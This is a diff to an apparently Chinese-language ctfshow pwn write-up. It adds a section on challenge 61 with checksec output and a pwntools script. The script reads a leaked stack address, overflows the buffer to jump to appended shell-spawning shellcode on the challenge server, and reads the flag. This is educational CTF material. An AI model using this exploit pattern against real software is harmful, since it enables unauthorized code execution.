@@ -107,7 +107,45 @@ p.sendlineafter(b'.\n',password)
 p.interactive()
 ```
 
-## 66 \x00绕过可能后面还要补一个\xc0或\x22什么的指令填充一下
+## 61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令
+
+#### 有PIE，栈可执行，有RWX
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/61/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+```
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p =remote('pwn.challenge.ctf.show',28273)
+#gdb.attach(p)
+
+p.recvuntil(b'[')
+v5 = int(p.recvuntil(b']',drop=True),16)
+shellcode = asm(shellcraft.sh())
+payload = b'a'*0x10+b'b'*0x8+p64(v5+0x20)+shellcode
+p.sendline(payload)
+p.sendline(b'cat ctfshow_flag')
+p.interactive()
+```
+
+## 66 \x00绕过字符串
 
 ```python
 from pwn import *
